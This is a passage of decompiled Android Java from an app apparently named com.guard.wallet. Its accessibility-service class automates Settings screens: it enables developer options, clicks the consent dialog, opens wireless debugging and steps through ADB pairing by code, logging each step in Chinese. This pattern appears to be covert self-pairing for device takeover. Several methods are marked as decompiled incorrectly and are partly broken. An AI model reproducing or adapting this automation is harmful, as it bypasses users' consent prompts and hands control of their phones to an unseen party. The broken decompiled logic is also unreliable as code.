            StringCondition m1008b2 = AbstractC0413b.m1008b(combineFilter2, AbstractC0000a.m7c(combineFilter2, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("PAIR_DEVELOPER_OPTION_3_TEXT", m1008b2, combineFilter2, m1008b2);
        }
        if (combineFilter2 != null) {
            combineFiltersWithOr.getFilters().add(combineFilter2);
        }
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVELOPER_OPTION_4_TEXT"))) {
            combineFilter3 = null;
        } else {
            combineFilter3 = new CombineFilter();
            StringCondition m1008b3 = AbstractC0413b.m1008b(combineFilter3, AbstractC0000a.m7c(combineFilter3, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("PAIR_DEVELOPER_OPTION_4_TEXT", m1008b3, combineFilter3, m1008b3);
        }
        if (combineFilter3 != null) {
            combineFiltersWithOr.getFilters().add(combineFilter3);
        }
        if (!AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVELOPER_OPTION_5_TEXT"))) {
            combineFilter4 = new CombineFilter();
            StringCondition m1008b4 = AbstractC0413b.m1008b(combineFilter4, AbstractC0000a.m7c(combineFilter4, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("PAIR_DEVELOPER_OPTION_5_TEXT", m1008b4, combineFilter4, m1008b4);
        }
        if (combineFilter4 != null) {
            combineFiltersWithOr.getFilters().add(combineFilter4);
        }
        return combineFiltersWithOr;
    }

    public static CombineFilter c0() {
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DISABLE_ADB_WITH_AUTH_TIMEOUT_TEXT"))) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        m1008b.setContains(AbstractC0250f.m627b("PAIR_DISABLE_ADB_WITH_AUTH_TIMEOUT_TEXT"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    public static CombineFilter d0() {
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_ENABLE_DEBUG_AFTER_CONNECTED_WIFI_TEXT"))) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        m1008b.setContains(AbstractC0250f.m627b("PAIR_ENABLE_DEBUG_AFTER_CONNECTED_WIFI_TEXT"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    /* JADX WARN: Code restructure failed: missing block: B:14:0x004b, code lost:
    
        android.util.Log.d("PairAccessibilityDelegate", "checkboxNode is not null");
        r0.set(0);
        r1 = r4.checked();
     */
    /* JADX WARN: Code restructure failed: missing block: B:15:0x0058, code lost:
    
        if (r1 != false) goto L29;
     */
    /* JADX WARN: Code restructure failed: missing block: B:17:0x005f, code lost:
    
        if (r0.incrementAndGet() > 5) goto L30;
     */
    /* JADX WARN: Code restructure failed: missing block: B:18:0x0061, code lost:
    
        r4.click();
        android.util.Log.d("PairAccessibilityDelegate", "checkboxNode is click");
        r2.setClicked(true);
        com.guard.wallet.utils.AbstractC0251g.T0(20);
        r4.refresh();
        r1 = r4.checked();
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static CheckedResult e0(UiObject uiObject) {
        boolean z2 = false;
        AtomicInteger atomicInteger = new AtomicInteger(0);
        CheckedResult checkedResult = new CheckedResult();
        try {
            UiObject uiObject2 = uiObject.checkable() ? uiObject : null;
            CombineFilter combineFilter = new CombineFilter();
            combineFilter.setBoolConditions(new LinkedList());
            combineFilter.getBoolConditions().add(new BoolCondition("checkable", true, true));
            MyAccessibilityService.m548I(uiObject);
            while (uiObject != null && uiObject2 == null && atomicInteger.incrementAndGet() <= 3) {
                uiObject2 = uiObject.findOneByCombine(combineFilter);
                uiObject = uiObject.parent();
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
        }
        checkedResult.setChecked(z2);
        return checkedResult;
    }

    /* JADX WARN: Code restructure failed: missing block: B:12:0x0038, code lost:
    
        r1.setChecked(r3.checked());
        r0 = 20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:13:0x0046, code lost:
    
        if (r1.isChecked() != false) goto L26;
     */
    /* JADX WARN: Code restructure failed: missing block: B:15:0x004c, code lost:
    
        if (r3.click() == false) goto L26;
     */
    /* JADX WARN: Code restructure failed: missing block: B:16:0x004e, code lost:
    
        android.util.Log.d("PairAccessibilityDelegate", "switchNode clicked");
        r1.setClicked(true);
        r3.refresh();
        r1.setChecked(r3.checked());
     */
    /* JADX WARN: Code restructure failed: missing block: B:17:0x0060, code lost:
    
        if (r0 <= 0) goto L47;
     */
    /* JADX WARN: Code restructure failed: missing block: B:19:0x0066, code lost:
    
        if (r1.isChecked() != false) goto L48;
     */
    /* JADX WARN: Code restructure failed: missing block: B:20:0x0068, code lost:
    
        com.guard.wallet.utils.AbstractC0251g.T0(1);
        r3.refresh();
        r1.setChecked(r3.checked());
        r0 = r0 - 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:24:0x007c, code lost:
    
        if (r1.isChecked() != false) goto L41;
     */
    /* JADX WARN: Code restructure failed: missing block: B:26:0x0082, code lost:
    
        if (r1.isClicked() != false) goto L41;
     */
    /* JADX WARN: Code restructure failed: missing block: B:27:0x0084, code lost:
    
        r7 = r3.findParentUtilCombine(m987T());
     */
    /* JADX WARN: Code restructure failed: missing block: B:28:0x008c, code lost:
    
        if (r7 == null) goto L41;
     */
    /* JADX WARN: Code restructure failed: missing block: B:30:0x0092, code lost:
    
        if (r7.click() == false) goto L41;
     */
    /* JADX WARN: Code restructure failed: missing block: B:31:0x0094, code lost:
    
        r1.setClicked(true);
        r3.refresh();
        r1.setChecked(r3.checked());
     */
    /* JADX WARN: Code restructure failed: missing block: B:32:0x00a1, code lost:
    
        if (r0 <= 0) goto L49;
     */
    /* JADX WARN: Code restructure failed: missing block: B:34:0x00a7, code lost:
    
        if (r1.isChecked() != false) goto L50;
     */
    /* JADX WARN: Code restructure failed: missing block: B:35:0x00a9, code lost:
    
        com.guard.wallet.utils.AbstractC0251g.T0(1);
        r3.refresh();
        r1.setChecked(r3.checked());
     */
    /* JADX WARN: Code restructure failed: missing block: B:36:0x00b6, code lost:
    
        r0 = r0 - 1;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static CheckedResult h0(UiObject uiObject) {
        UiObject uiObject2;
        CombineFilter Q0;
        AtomicInteger atomicInteger = new AtomicInteger(0);
        CheckedResult checkedResult = new CheckedResult();
        if (uiObject != null) {
            try {
            } catch (Exception e2) {
                AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
            }
            if (uiObject.checkable()) {
                uiObject2 = uiObject;
                Q0 = Q0();
                MyAccessibilityService.m548I(uiObject);
                while (uiObject != null && uiObject2 == null && atomicInteger.incrementAndGet() <= 3) {
                    uiObject2 = uiObject.findOneByCombine(Q0);
                    uiObject = uiObject.parent();
                }
                return checkedResult;
            }
        }
        uiObject2 = null;
        Q0 = Q0();
        MyAccessibilityService.m548I(uiObject);
        while (uiObject != null) {
            uiObject2 = uiObject.findOneByCombine(Q0);
            uiObject = uiObject.parent();
        }
        return checkedResult;
    }

    public static ListenWindow i0() {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        listenWindow.setMatchs(new LinkedList());
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        listenWindow.getMatchs().add(m991X());
        return listenWindow;
    }

    public static ListenWindow j0() {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        listenWindow.setMatchs(new LinkedList());
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        listenWindow.getMatchs().add(m993Z());
        return listenWindow;
    }

    public static ListenWindow k0() {
        CombineFilter V0 = V0();
        if (V0 == null) {
            return null;
        }
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(V0);
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow l0() {
        CombineFilter X0 = X0();
        if (X0 == null) {
            return null;
        }
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(X0);
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow m0() {
        CombineFilter V0 = V0();
        if (V0 == null) {
            return null;
        }
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.hihonor.settingslib.SubSettings");
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(V0);
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow n0() {
        CombineFilter X0 = X0();
        if (X0 == null) {
            return null;
        }
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.hihonor.settingslib.SubSettings");
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(X0);
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow o0() {
        ListenWindow listenWindow = new ListenWindow(null, null);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        listenWindow.getMatchs().add(m991X());
        return listenWindow;
    }

    public static ListenWindow p0() {
        ListenWindow listenWindow = new ListenWindow(null, null);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        listenWindow.getMatchs().add(m991X());
        return listenWindow;
    }

    public static CombineFilter q0() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.widget.LinearLayout"));
        return combineFilter;
    }

    public static ListenWindow r0() {
        ListenWindow listenWindow = new ListenWindow("com.android.systemui", "miuix.appcompat.app.AlertDialog");
        AbstractC0413b.m1023q(16384, AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow), listenWindow).add(1);
        return listenWindow;
    }

    public static ListenWindow s0() {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.MiuiSettings");
        listenWindow.setMatchs(new LinkedList());
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        listenWindow.getMatchs().add(m993Z());
        return listenWindow;
    }

    public static boolean t0() {
        if (!AbstractC0249e.m620i() && !AbstractC0249e.m624m()) {
            return false;
        }
        Log.d("PairAccessibilityDelegate", "该手机需要进一步完成其他设置");
        return true;
    }

    public static CombineFilter u0() {
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVICE_USE_PAIR_CODE_TEXT"))) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList());
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty(TextBundle.TEXT_ENTRY);
        stringCondition.setContains(AbstractC0250f.m627b("PAIR_DEVICE_USE_PAIR_CODE_TEXT"));
        combineFilter.getStringConditions().add(stringCondition);
        return combineFilter;
    }

    public static ListenWindow v0() {
        CombineFilter combineFilter;
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVICE_BY_CODE_2_TEXT"))) {
            combineFilter = null;
        } else {
            combineFilter = new CombineFilter();
            StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("PAIR_DEVICE_BY_CODE_2_TEXT", m1008b, combineFilter, m1008b);
        }
        if (combineFilter == null) {
            return null;
        }
        ListenWindow listenWindow = new ListenWindow("com.android.settings", null);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(combineFilter);
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow w0() {
        CombineFilter combineFilter;
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVICE_BY_CODE_3_TEXT"))) {
            combineFilter = null;
        } else {
            combineFilter = new CombineFilter();
            StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("PAIR_DEVICE_BY_CODE_3_TEXT", m1008b, combineFilter, m1008b);
        }
        if (combineFilter == null) {
            return null;
        }
        ListenWindow listenWindow = new ListenWindow("com.android.settings", null);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(combineFilter);
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow x0() {
        CombineFilter combineFilter;
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVICE_BY_CODE_TEXT"))) {
            combineFilter = null;
        } else {
            combineFilter = new CombineFilter();
            StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("PAIR_DEVICE_BY_CODE_TEXT", m1008b, combineFilter, m1008b);
        }
        if (combineFilter == null) {
            return null;
        }
        ListenWindow listenWindow = new ListenWindow("com.android.settings", null);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(combineFilter);
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow y0() {
        CombineFilter combineFilter;
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_FAILED_2_TEXT"))) {
            combineFilter = null;
        } else {
            combineFilter = new CombineFilter();
            StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("PAIR_FAILED_2_TEXT", m1008b, combineFilter, m1008b);
        }
        if (combineFilter == null) {
            return null;
        }
        ListenWindow listenWindow = new ListenWindow("com.android.settings", null);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(combineFilter);
        listenWindow.getEventSubscribes().add(C0());
        return listenWindow;
    }

    public static ListenWindow z0() {
        CombineFilter combineFilter;
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_FAILED_3_TEXT"))) {
            combineFilter = null;
        } else {
            combineFilter = new CombineFilter();
            StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("PAIR_FAILED_3_TEXT", m1008b, combineFilter, m1008b);
        }
        if (combineFilter == null) {
            return null;
        }
        ListenWindow listenWindow = new ListenWindow("com.android.settings", null);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(combineFilter);
        listenWindow.getEventSubscribes().add(C0());
        return listenWindow;
    }

    public final void D0() {
        try {
            if (Objects.equals(this.f841p.get(), EnumC0894g.PAIR_DEPT_PAIR_FINISH)) {
                return;
            }
            N0();
        } catch (Exception e2) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:58:0x00ea, code lost:
    
        return r4;
     */
    /* JADX WARN: Removed duplicated region for block: B:61:0x00ed A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:62:0x00ee  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final UiObject G0(UiObject uiObject) {
        UiObject uiObject2;
        UiObject uiObject3;
        UiObject uiObject4;
        UiObject uiObject5;
        AtomicInteger atomicInteger;
        UiObject uiObject6 = null;
        try {
            atomicInteger = new AtomicInteger(0);
            uiObject.refresh();
            Log.d("PairAccessibilityDelegate", "开始滚动查找无线调试栏目");
            uiObject5 = uiObject.findOneByCombine(X0());
            try {
                uiObject3 = uiObject.findOneByCombine(V0());
            } catch (Exception e2) {
                e = e2;
                uiObject3 = null;
            }
        } catch (Exception e3) {
            e = e3;
            uiObject2 = null;
            uiObject3 = null;
            uiObject4 = null;
        }
        try {
            uiObject4 = uiObject.findOneByCombine(c0());
        } catch (Exception e4) {
            e = e4;
            uiObject2 = null;
            uiObject4 = null;
            uiObject6 = uiObject5;
            AbstractC0026q.m186s("PairAccessibilityDelegate", e);
            uiObject5 = uiObject6;
            uiObject6 = uiObject2;
            if (uiObject3 != null) {
            }
        }
        try {
            uiObject6 = uiObject.findOneByCombine(d0());
            while (uiObject.canScrollForward() && atomicInteger.incrementAndGet() < 10) {
                Log.d("PairAccessibilityDelegate", "滚动视图可以向下滚动");
                if (uiObject5 != null || uiObject3 != null || uiObject4 != null || uiObject6 != null) {
                    break;
                }
                if (uiObject.scrollForward()) {
                    Log.d("PairAccessibilityDelegate", "向下滚动查找无线调试栏目");
                    AbstractC0251g.T0(10);
                    uiObject.refresh();
                    uiObject5 = uiObject.findOneByCombine(X0());
                    uiObject3 = uiObject.findOneByCombine(V0());
                    uiObject4 = uiObject.findOneByCombine(c0());
                    uiObject6 = uiObject.findOneByCombine(d0());
                }
            }
            atomicInteger.set(0);
            UiObject f02 = f0();
            if (f02 != null) {
                while (f02.canScrollBackward() && atomicInteger.incrementAndGet() < 10) {
                    Log.d("PairAccessibilityDelegate", "滚动视图可以向上滚动");
                    if (uiObject5 != null || uiObject3 != null || uiObject4 != null || uiObject6 != null) {
                        break;
                    }
                    if (f02.scrollBackward()) {
                        Log.d("PairAccessibilityDelegate", "向上滚动查找无线调试栏目");
                        AbstractC0251g.T0(10);
                        f02.refresh();
                        uiObject5 = f02.findOneByCombine(X0());
                        uiObject3 = f02.findOneByCombine(V0());
                        uiObject4 = f02.findOneByCombine(c0());
                        uiObject6 = f02.findOneByCombine(d0());
                    }
                }
            }
        } catch (Exception e5) {
            e = e5;
            uiObject2 = uiObject6;
            uiObject6 = uiObject5;
            AbstractC0026q.m186s("PairAccessibilityDelegate", e);
            uiObject5 = uiObject6;
            uiObject6 = uiObject2;
            if (uiObject3 != null) {
            }
        }
        return uiObject3 != null ? uiObject3 : uiObject4 != null ? uiObject4 : uiObject6;
    }

    /* renamed from: K */
    public final boolean m994K() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(m983I());
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("PairAccessibilityDelegate", "已进入允许开发者选项窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
            return false;
        }
    }

    /* renamed from: L */
    public final boolean m995L() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(m992Y());
            linkedList.add(m990W());
            linkedList.add(s0());
            linkedList.add(P0());
            linkedList.add(O0());
            linkedList.add(j0());
            linkedList.add(i0());
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("PairAccessibilityDelegate", "已进入开发者、开发人员选项窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
            return false;
        }
    }

    /* renamed from: M */
    public final boolean m996M() {
        try {
            LinkedList linkedList = new LinkedList();
            ListenWindow x02 = x0();
            if (x02 != null) {
                linkedList.add(x02);
            }
            ListenWindow v02 = v0();
            if (v02 != null) {
                linkedList.add(v02);
            }
            ListenWindow w02 = w0();
            if (w02 != null) {
                linkedList.add(w02);
            }
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("PairAccessibilityDelegate", "已进入使用配对码对话框");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
            return false;
        }
    }

    /* renamed from: N */
    public final boolean m997N() {
        try {
            LinkedList linkedList = new LinkedList();
            ListenWindow B0 = B0();
            if (B0 != null) {
                linkedList.add(B0);
            }
            ListenWindow y02 = y0();
            if (y02 != null) {
                linkedList.add(y02);
            }
            ListenWindow z02 = z0();
            if (z02 != null) {
                linkedList.add(z02);
            }
            ListenWindow A0 = A0();
            if (A0 != null) {
                linkedList.add(A0);
            }
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("PairAccessibilityDelegate", "已进入配对失败对话框");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
            return false;
        }
    }

    public final void N0() {
        ReentrantLock reentrantLock = this.f842q;
        if (reentrantLock.tryLock()) {
            AtomicBoolean atomicBoolean = this.f843r;
            try {
                if (!atomicBoolean.get()) {
                    Log.d("PairAccessibilityDelegate", "准备结束本地配对自动化引擎");
                    atomicBoolean.set(true);
                    AbstractC0184g.m354h(100);
                    if (C0318e.m844S() != null) {
                        Log.d("PairAccessibilityDelegate", "pairInFinish finishLocalAdbPair");
                        C0318e.m844S().f615m.set(true);
                        if (C0262b.m737c()) {
                            C0262b.m738d();
                        }
                        if (MyAccessibilityService.m554P() != null) {
                            MyAccessibilityService.m554P().m540u();
                            MyAccessibilityService.m554P().m545z();
                            MyAccessibilityService.m554P().m517B();
                        }
                    } else {
                        if (C0262b.m737c()) {
                            C0262b.m738d();
                        }
                        if (MyAccessibilityService.m554P() != null) {
                            Log.d("PairAccessibilityDelegate", "pairInFinish removePairAccessibilityDelegate");
                            MyAccessibilityService.m554P().m540u();
                            MyAccessibilityService.m554P().m545z();
                            MyAccessibilityService.m554P().m517B();
                        }
                    }
                    this.f839n.shutdownNow();
                    this.f841p.set(EnumC0894g.PAIR_DEPT_PAIR_FINISH);
                    AbstractC0243l.m591a(this.f864c);
                    this.f840o.clear();
                    if (AbstractC0026q.m162M()) {
                        AbstractC0251g.T0(5);
                    }
                    AbstractC0184g.m349c();
                    Log.d("PairAccessibilityDelegate", "已结束本地配对自动化引擎");
                    super.mo1001d();
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
            }
            reentrantLock.unlock();
        }
    }

    /* renamed from: O */
    public final boolean m998O() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(M0());
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("PairAccessibilityDelegate", "已进入USB安全设置窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
            return false;
        }
    }

    /* renamed from: P */
    public final boolean m999P() {
        try {
            LinkedList linkedList = new LinkedList();
            ListenWindow W0 = W0();
            if (W0 != null) {
                linkedList.add(W0);
            }
            ListenWindow U0 = U0();
            if (U0 != null) {
                linkedList.add(U0);
            }
            ListenWindow l02 = l0();
            if (l02 != null) {
                linkedList.add(l02);
            }
            ListenWindow k02 = k0();
            if (k02 != null) {
                linkedList.add(k02);
            }
            ListenWindow n02 = n0();
            if (n02 != null) {
                linkedList.add(n02);
            }
            ListenWindow m02 = m0();
            if (m02 != null) {
                linkedList.add(m02);
            }
            linkedList.add(Y0());
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("PairAccessibilityDelegate", "已进入无线调试窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
            return false;
        }
    }

    /* renamed from: Q */
    public final boolean m1000Q() {
        try {
            LinkedList linkedList = new LinkedList();
            ListenWindow Y0 = Y0();
            if (Y0 != null) {
                linkedList.add(Y0);
            }
            ListenWindow Z0 = Z0();
            if (Z0 != null) {
                linkedList.add(Z0);
            }
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("PairAccessibilityDelegate", "已进入无线调试窗口(使用配对码配对)");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
            return false;
        }
    }

    public final boolean T0(UiObject uiObject) {
        boolean z2;
        boolean z3;
        try {
            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
            UiObject findOneByOperateOr = uiObject.findOneByOperateOr(a0());
            if (findOneByOperateOr == null) {
                uiObject.scrollBackwardEnd();
                m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                AbstractC0251g.T0(5);
                uiObject = f0();
                if (uiObject != null) {
                    findOneByOperateOr = uiObject.findOneByOperateOr(a0());
                }
            }
            if (findOneByOperateOr == null && uiObject != null) {
                UiObject findOneByOperateOr2 = uiObject.findOneByOperateOr(b0());
                if (findOneByOperateOr2 == null) {
                    uiObject.scrollBackwardEnd();
                    m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                    AbstractC0251g.T0(5);
                    UiObject f02 = f0();
                    if (f02 != null) {
                        findOneByOperateOr2 = f02.findOneByOperateOr(b0());
                    }
                }
                if (findOneByOperateOr2 != null) {
                    Log.d("PairAccessibilityDelegate", "开发者选项栏目查找成功");
                    UiObject parent = findOneByOperateOr2.parent();
                    AtomicInteger atomicInteger = new AtomicInteger(0);
                    UiObject uiObject2 = null;
                    if (parent != null) {
                        try {
                            if (parent.checkable()) {
                                uiObject2 = parent;
                            }
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
                        }
                    }
                    CombineFilter Q0 = Q0();
                    MyAccessibilityService.m548I(parent);
                    while (parent != null && uiObject2 == null) {
                        if (atomicInteger.incrementAndGet() > 5) {
                            break;
                        }
                        uiObject2 = parent.findOneByCombine(Q0);
                        parent = parent.parent();
                    }
                    findOneByOperateOr = uiObject2;
                } else {
                    Log.e("PairAccessibilityDelegate", "开发者选项栏目查找失败");
                }
            }
            if (findOneByOperateOr != null) {
                z2 = findOneByOperateOr.checked();
                z3 = !z2 ? findOneByOperateOr.clickPosition(0.95f, 0.5f) : false;
            } else {
                z2 = false;
                z3 = false;
            }
            if (z3) {
                AtomicInteger atomicInteger2 = new AtomicInteger(10);
                boolean m994K = m994K();
                while (!m994K) {
                    try {
                        if (atomicInteger2.decrementAndGet() < 0) {
                            break;
                        }
                        AbstractC0251g.T0(1);
                        m994K = m994K();
                    } catch (Exception e3) {
                        AbstractC0026q.m186s("PairAccessibilityDelegate", e3);
                    }
                }
                if (m994K) {
                    Log.d("PairAccessibilityDelegate", "开发者选项已点击,已弹出允许开发设置对话框");
                    UiObject findOneByCombine = m1072k().findOneByCombine(m988U());
                    if (findOneByCombine != null && findOneByCombine.click()) {
                        Log.d("PairAccessibilityDelegate", "已点击允许打开开发者选项");
                        return true;
                    }
                }
            }
        } catch (Exception e4) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e4);
        }
        if (z2) {
            Log.d("PairAccessibilityDelegate", "开发者选项已勾选");
            return true;
        }
        Log.e("PairAccessibilityDelegate", "开发者选项未勾选");
        return false;
    }

    @Override // p012o.C0416e
    /* renamed from: d */
    public final void mo1001d() {
        try {
            this.f839n.shutdownNow();
            AbstractC0243l.m591a(this.f864c);
            this.f840o.clear();
            super.mo1001d();
        } catch (Exception e2) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
        }
    }

    @Override // p012o.C0416e
    public final boolean equals(Object obj) {
        return obj instanceof a0;
    }

    public final UiObject f0() {
        UiObject findOneByOperateOr;
        try {
            if (m1072k() == null) {
                return null;
            }
            AtomicInteger atomicInteger = new AtomicInteger(0);
            UiObject m1072k = m1072k();
            CombineFiltersWithOr H0 = H0();
            while (true) {
                findOneByOperateOr = m1072k.findOneByOperateOr(H0);
                if (findOneByOperateOr != null || atomicInteger.incrementAndGet() >= 10) {
                    break;
                }
                AbstractC0251g.T0(5);
                m1072k().refresh();
                m1072k = m1072k();
                H0 = H0();
            }
            return findOneByOperateOr;
        } catch (Exception e2) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
            return null;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:12:0x0036, code lost:
    
        r7 = r2.checked();
     */
    /* JADX WARN: Code restructure failed: missing block: B:13:0x003a, code lost:
    
        r8 = 20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:14:0x003d, code lost:
    
        if (r7 != false) goto L28;
     */
    /* JADX WARN: Code restructure failed: missing block: B:15:0x0064, code lost:
    
        if (r7 != false) goto L38;
     */
    /* JADX WARN: Code restructure failed: missing block: B:16:0x0066, code lost:
    
        r3 = r2.findParentUtilCombine(m987T());
     */
    /* JADX WARN: Code restructure failed: missing block: B:17:0x006e, code lost:
    
        if (r3 == null) goto L38;
     */
    /* JADX WARN: Code restructure failed: missing block: B:19:0x0074, code lost:
    
        if (r3.click() == false) goto L38;
     */
    /* JADX WARN: Code restructure failed: missing block: B:20:0x0076, code lost:
    
        r1.setClicked(true);
        r2.refresh();
        r7 = r2.checked();
     */
    /* JADX WARN: Code restructure failed: missing block: B:21:0x0080, code lost:
    
        if (r8 <= 0) goto L49;
     */
    /* JADX WARN: Code restructure failed: missing block: B:22:0x0082, code lost:
    
        if (r7 != false) goto L50;
